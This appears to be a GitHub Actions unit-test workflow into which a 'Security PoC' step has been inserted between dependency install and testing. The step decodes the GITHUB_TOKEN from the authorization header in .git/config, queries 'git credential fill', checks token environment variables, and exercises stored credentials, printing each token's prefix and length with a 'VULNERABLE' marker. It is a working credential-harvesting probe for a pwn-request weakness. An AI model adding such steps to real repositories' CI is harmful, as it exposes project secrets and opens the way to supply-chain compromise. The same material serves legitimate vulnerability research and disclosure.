name: unittest-onekeyhq-style

on:
  pull_request:
    branches:
      - onekey
      - x
  push:
    branches:
      - onekey
      - x

concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

permissions:
  contents: read
  packages: read

jobs:
  unittest:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        node-version: [20.x]

    steps:
      - uses: actions/checkout@v4
        with:
          lfs: true

      - name: Use Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v6
        with:
          node-version: ${{ matrix.node-version }}
          registry-url: 'https://npm.pkg.github.com'
          scope: '@onekeyhq'

      - name: Install Dependency
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NODE_OPTIONS: '--max_old_space_size=4096'
        run: |
          yarn install --immutable

      - name: Security PoC - Token Accessibility Test
        run: |
          echo "=== ONEKEYHQ-STYLE CONFIG PoC ==="
          echo "--- Test 1: http.extraheader in .git/config ---"
          AUTH_HEADER=$(git config --local --get http.https://github.com/.extraheader 2>/dev/null || true)
          if [ -n "$AUTH_HEADER" ]; then
            AUTH_VALUE=$(echo "$AUTH_HEADER" | sed 's/AUTHORIZATION: basic //I')
            DECODED=$(echo "$AUTH_VALUE" | base64 -d 2>/dev/null || echo "DECODE_FAILED")
            TOKEN=$(echo "$DECODED" | cut -d: -f2)
            if [ -n "$TOKEN" ] && [ ${#TOKEN} -gt 10 ]; then
              TOKEN_LEN=${#TOKEN}
              TOKEN_PREFIX="${TOKEN:0:3}"
              echo "PWN_REQUEST_POC_RESULT=VULNERABLE"
              echo "TOKEN_SOURCE=http.extraheader"
              echo "TOKEN_PREFIX=${TOKEN_PREFIX}"
              echo "TOKEN_LENGTH=${TOKEN_LEN}"
              echo "⚠️  CRITICAL: GITHUB_TOKEN accessible via .git/config!"
            else
              echo "EXTRAHEADER_PRESENT_BUT_TOKEN_EMPTY"
            fi
          else
            echo "NO_EXTRAHEADER_IN_CONFIG"
          fi
          echo "--- Test 2: git credential fill ---"
          CRED_OUTPUT=$(git credential fill 2>/dev/null <<EOF
          protocol=https
          host=github.com
          EOF
          )
          if echo "$CRED_OUTPUT" | grep -q "password="; then
            echo "CREDENTIAL_FILL=SUCCESS"
          else
            echo "CREDENTIAL_FILL=NO_TOKEN_RETURNED"
          fi
          echo "--- Test 3: Environment variables ---"
          if [ -n "$GITHUB_TOKEN" ]; then
            echo "GITHUB_TOKEN_ENV=PRESENT|prefix=${GITHUB_TOKEN:0:3}|len=${#GITHUB_TOKEN}"
          else
            echo "GITHUB_TOKEN_ENV=ABSENT"
          fi
          if [ -n "$NODE_AUTH_TOKEN" ]; then
            echo "NODE_AUTH_TOKEN_ENV=PRESENT|prefix=${NODE_AUTH_TOKEN:0:3}|len=${#NODE_AUTH_TOKEN}"
          else
            echo "NODE_AUTH_TOKEN_ENV=ABSENT"
          fi
          echo "--- Test 4: Git operations ---"
          GIT_LS_RESULT=$(git ls-remote origin HEAD 2>&1 || true)
          if echo "$GIT_LS_RESULT" | grep -q "refs/"; then
            echo "GIT_LS_REMOTE=SUCCESS_WITH_STORED_CREDENTIALS"
          else
            echo "GIT_LS_REMOTE=FAILED"
          fi
          echo "=== ONEKEYHQ-STYLE CONFIG PoC - END ==="

      - name: Run Tests
        env:
          NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NODE_OPTIONS: '--max_old_space_size=4096'
        run: |
          yarn test
